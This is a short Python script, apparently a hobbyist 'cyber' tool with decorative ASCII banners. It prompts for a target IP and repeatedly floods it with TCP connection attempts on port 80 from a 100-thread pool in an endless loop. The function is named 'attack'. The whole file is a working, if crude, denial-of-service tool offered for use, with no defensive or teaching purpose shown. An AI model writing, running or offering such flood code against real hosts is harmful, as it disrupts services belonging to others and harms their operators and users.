import socket
import threading
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor
import time

init()

P = Fore.MAGENTA
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
RES = Fore.RESET

def show_banner():
    print(P + r"""
  ██╗  ██╗ █████╗ ██╗     ██╗    ███╗   ██╗ ██████╗ ██╗   ██╗
  ██║ ██╔╝██╔══██╗██║     ██║    ████╗  ██║██╔═══██╗██║   ██║
  █████╔╝ ███████║██║     ██║    ██╔██╗ ██║██║   ██║██║   ██║
  ██╔═██╗ ██╔══██║██║     ██║    ██║╚██╗██║██║   ██║██║   ██║
  ██║  ██╗██║  ██║███████╗███████╗██║ ╚████║╚██████╔╝╚██████╔╝
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ 
  """ + RES)
    
    print(C + r"""
   ▄████████  ▄██████▄     ▄████████    ▄████████ 
  ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    █▀  ███    ███   ███    ███   ███    █▀  
  ███        ███    ███  ▄███▄▄▄▄██▀  ▄███▄▄▄     
▀███████████ ███    ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     
         ███ ███    ███ ▀███████████   ███    █▄  
   ▄█    ███ ███    ███   ███    ███   ███    ███ 
 ▄████████▀   ▀██████▀    ███    ███   ██████████ 
                          ███    ███              
  """ + RES)
    
    print(Y + "═"*60 + RES)
    print(P + " "*20 + "KALINOVA CYBER SYSTEMS" + " "*20 + RES)
    print(G + " "*23 + "DEV: @MAKTPAXEP_KAPAMElKA" + " "*23 + RES)
    print(Y + "═"*60 + RES + "\n")

def attack(target_ip, port=80):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        print(G + f"[+] Connection established to {target_ip}:{port}" + RES)
        sock.close()
    except Exception as e:
        print(R + f"[-] Error: {e}" + RES)

def main():
    show_banner()
    target = input(P + "[?] Enter target IP: " + RES)
    NUM_THREADS = 100

    try:
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            while True:
                for i in range(NUM_THREADS):
                    executor.submit(attack, target)
                    print(C + f"[~] Thread {i+1} submitted to the pool" + RES)
                time.sleep(0.1)
    except KeyboardInterrupt:
        print(R + "\n[!] Attack stopped by user." + RES)

if __name__ == "__main__":
    main()